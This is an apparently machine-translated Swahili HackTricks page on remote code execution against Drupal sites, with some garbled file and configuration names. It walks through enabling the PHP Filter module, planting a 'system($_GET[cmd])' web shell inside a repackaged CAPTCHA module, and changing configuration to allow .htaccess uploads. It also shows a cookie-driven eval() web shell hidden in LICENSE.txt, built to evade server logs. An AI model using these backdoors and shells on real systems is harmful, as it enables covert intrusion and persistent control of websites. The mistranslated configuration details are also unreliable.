# Drupal RCE

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Kwa Kutumia Moduli ya PHP Filter

{% hint style="warning" %}
Katika toleo za zamani za Drupal **(kabla ya toleo la 8)**, ilikuwa inawezekana kuingia kama msimamizi na **kuwezesha moduli ya `PHP filter`**, ambayo "Inaruhusu nambari/snippets za PHP zilizowekwa kuchambuliwa." Lakini kutoka toleo la 8 moduli hii haipo kwa chaguo-msingi.
{% endhint %}

Unahitaji **programu-jalizi ya php iwe imewekwa** (angalia kwa kufikia _/modules/php_ na ikiwa inarudisha **403** basi, **ipo**, ikiwa **haipatikani**, basi **programu-jalizi ya php haijawekwa**)

Nenda kwa _Modules_ -> (**Angalia**) _PHP Filter_ -> _Hifadhi mazingira_

![](<../../../.gitbook/assets/image (247) (1).png>)

Kisha bofya _Ongeza maudhui_ -> Chagua _Ukurasa wa Msingi_ au _Makala -_> Andika _mimba ya php kwenye mwili_ -> Chagua _Nambari ya PHP_ katika _Muundo wa Maandishi_ -> Chagua _Onesha_

![](<../../../.gitbook/assets/image (338).png>)

Hatimaye tuifikie nodi iliyoumbwa hivi karibuni:
```bash
curl http://drupal-site.local/node/3
```
## Sakinisha Moduli ya Kichujio cha PHP

{% hint style="warning" %}
Katika toleo la sasa, siwezi tena kusakinisha programu-jalizi kwa kufikia wavuti baada ya usakinishaji wa msingi.
{% endhint %}

Tangu toleo **8 kuendelea**, [**Moduli ya Kichujio cha PHP**](https://www.drupal.org/project/php/releases/8.x-1.1) **haitasakinishwa kwa msingi**. Ili kutumia kazi hii, tutahitaji **kusakinisha moduli wenyewe**.

1. Pakua toleo jipya zaidi la moduli kutoka kwenye wavuti ya Drupal.
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. Baada ya kupakua, nenda kwa **`Utawala`** > **`Ripoti`** > **`Visasisho vinavyopatikana`**.
3. Bonyeza **`Tafuta`**, chagua faili kutoka kwenye saraka tuliyoidownload, kisha bonyeza **`Sakinisha`**.
4. Baada ya moduli kusakinishwa, tunaweza bonyeza **`Maudhui`** na **umba ukurasa mpya wa msingi**, kama tulivyofanya kwenye mfano wa Drupal 7. Tena, hakikisha **uchague `Msimbo wa PHP` kutoka kwenye menyu ya `Muundo wa Matini`**.

## Moduli yenye mlango wa nyuma

{% hint style="warning" %}
Katika toleo la sasa, siwezi tena kusakinisha programu-jalizi kwa kufikia wavuti baada ya usakinishaji wa msingi.
{% endhint %}

Moduli yenye mlango wa nyuma inaweza kuundwa kwa **kuongeza ganda kwenye moduli iliyopo**. Moduli zinaweza kupatikana kwenye wavuti ya drupal.org. Chagua moduli kama vile [CAPTCHA](https://www.drupal.org/project/captcha). Endelea chini na nakili kiungo cha tar.gz [kumbukumbu](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

* Pakua kumbukumbu na fichua maudhui yake.
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* Unda **PHP web shell** na maudhui:
```php
<?php
system($_GET["cmd"]);
?>
```
* Kisha, tunahitaji kuunda faili ya **`.htaccess`** ili tupate ufikiaji wa folda. Hii ni muhimu kwani Drupal inakataa ufikiaji moja kwa moja kwenye folda ya **`/modules`**.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* Mipangilio hapo juu itatumika kwa sheria za folda ya / tunapouliza faili katika /modules. Nakili faili zote mbili kwenye folda ya captcha na unda kiunzi.
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* Kukadiria tuna **upatikanaji wa utawala** kwenye tovuti, bonyeza **`Simamia`** kisha **`Ongeza`** kwenye upau. Kisha bonyeza kitufe cha **`+ Sakinisha moduli mpya`**, na tutapelekwa kwenye ukurasa wa usakinishaji, kama vile `http://drupal-site.local/admin/modules/install` Tafadhali vinjari kwenye nyaraka iliyoharibiwa ya Captcha na bonyeza **`Sakinisha`**.
* Mara tu usakinishaji unapofanikiwa, vinjari kwa **`/modules/captcha/shell.php`** kutekeleza amri.

## Kuharibu Drupal na Usawazishaji wa Mipangilio <a href="#backdooring-drupal" id="backdooring-drupal"></a>

**Chapisho lililoshirikiwa na** [**Coiffeur0x90**](https://twitter.com/Coiffeur0x90)

### Sehemu 1 (kuamilisha _Media_ na _Media Library_)

Katika menyu ya _Ongeza_ (/admin/modules), unaweza kuamilisha inavyoonekana kuwa programu-jalizi tayari imesakinishwa. Kwa chaguo-msingi, programu-jalizi _Media_ na _Media Library_ hazionekani kuwa zimeamilishwa, kwa hivyo tuwaamilishe.

Kabla ya kuamilisha:

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Baada ya kuamilisha:

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### Sehemu 2 (kutumia kipengele cha _Usawazishaji wa Mipangilio_) <a href="#part-2-leveraging-feature-configuration-synchronization" id="part-2-leveraging-feature-configuration-synchronization"></a>

Tutatumia kipengele cha _Usawazishaji wa Mipangilio_ kudumpisha (kusafirisha) na kupakia (kuagiza) misingi ya mipangilio ya Drupal:

* /admin/config/development/configuration/single/export
* /admin/config/development/configuration/single/import

**Sakinisha mfumo.file.yml**

Anza kwa kusakinisha kuingia ya kwanza `ruhusu_mipakiaji_dhaifu` kutoka:

Faili: mfumo.file.yml
```

...

allow_insecure_uploads: false

...

```
<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

To:

Faili: system.file.yml
```

...

allow_insecure_uploads: true

...

```
<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

**Sakinisha uga.field.media.document.field\_media\_document.yml**

Kisha, sakinisha kuingia ya pili `file_extensions` kutoka:

Faili: uga.field.media.document.field\_media\_document.yml
```

...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...
```
<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

To:

Faili: field.field.media.document.field\_media\_document.yml
```
...

file_directory: '[date:custom:Y]-[date:custom:m]'
file_extensions: 'htaccess txt rtf doc docx ppt pptx xls xlsx pdf odf odg odp ods odt fodt fods fodp fodg key numbers pages'

...

```
> Sijatumia katika chapisho hili lakini imebainika kuwa inawezekana kufafanua kuingia `file_directory` kwa njia isiyo ya kawaida na kwamba ina hatari ya shambulio la njia (kwa hivyo tunaweza kurudi juu ndani ya mti wa mfumo wa faili wa Drupal).

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### Sehemu 3 (kutumia kipengee _Ongeza Waraka_) <a href="#sehemu-3-kutumia-kipengee-ongeza-waraka" id="sehemu-3-kutumia-kipengee-ongeza-waraka"></a>

Hatua ya mwisho ni rahisi zaidi, na imegawanywa katika hatua mbili. Ya kwanza ni kupakia faili katika muundo wa .htaccess ili kutumia maelekezo ya Apache na kuruhusu faili za .txt kuchambuliwa na injini ya PHP. Ya pili ni kupakia faili ya .txt yenye mzigo wetu.

Faili: .htaccess
```
<Files *>
SetHandler application/x-httpd-php
</Files>

# Vroum! Vroum!
# We reactivate PHP engines for all versions in order to be targetless.
<IfModule mod_php.c>
php_flag engine on
</IfModule>
<IfModule mod_php7.c>
php_flag engine on
</IfModule>
<IfModule mod_php5.c>
php_flag engine on
</IfModule>
```
Kwa nini hila hii ni nzuri?

Kwa sababu mara tu Webshell (ambayo tutaiita LICENSE.txt) inapowekwa kwenye seva ya Wavuti, tunaweza kuhamisha amri zetu kupitia `$_COOKIE` na kwenye magogo ya seva ya Wavuti, hii itaonekana kama ombi halali la GET kwa faili ya maandishi.

Kwa nini tuipate Webshell yetu LICENSE.txt?

Kwa sababu ikiwa tunachukua faili ifuatayo, kwa mfano [core/LICENSE.txt](https://github.com/drupal/drupal/blob/11.x/core/LICENSE.txt) (ambayo tayari ipo katika msingi wa Drupal), tuna faili ya mistari 339 na saizi ya 17.6 KB, ambayo ni kamili kwa kuongeza kipande kidogo cha nambari ya PHP katikati (kwa kuwa faili ni kubwa ya kutosha).

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Faili: LICENSE.txt iliyosasishwa
```txt

...

this License, you may choose any version ever published by the Free Software
Foundation.

<?php

# We inject our payload into the cookies so that in the logs of the compromised
# server it shows up as having been requested via the GET method, in order to
# avoid raising suspicions.
if (isset($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
if (!empty($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"])) {
eval($_COOKIE["89e127753a890d9c4099c872704a0711bbafbce9"]);
} else {
phpinfo();
}
}

?>

10. If you wish to incorporate parts of the Program into other free
programs whose distribution conditions are different, write to the author

...

```
#### **Sehemu 3.1 (kupakia faili .htaccess)**

Kwanza, tunatumia kipengele cha _Ongeza Hati_ (/media/add/document) kupakia faili yetu inayohusu maelekezo ya Apache (.htaccess).

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

**Sehemu 3.2 (kupakia faili LICENSE.txt)**

Kisha, tunatumia kipengele cha _Ongeza Hati_ (/media/add/document) tena kupakia Webshell iliyofichwa ndani ya faili ya leseni.

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

### Sehemu 4 (mwingiliano na Webshell) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

Sehemu ya mwisho inajumuisha mwingiliano na Webshell.

Kama inavyoonekana kwenye picha ifuatayo, ikiwa kuki inayotarajiwa na Webshell yetu haijatambuliwa, tunapata matokeo yanayofuata tunaposhauriana na faili kupitia kivinjari cha Wavuti.

<figure><img src="../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Mtu anapoweka kuki, anaweza kuingiliana na Webshell na kutekeleza amri yoyote anayotaka.

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Na kama unavyoona kwenye magogo, inaonekana kama faili ya txt tu imeombwa.

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Asante kwa kutumia muda wako kusoma makala hii, natumai itakusaidia kupata baadhi ya zilizoshikwa.

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
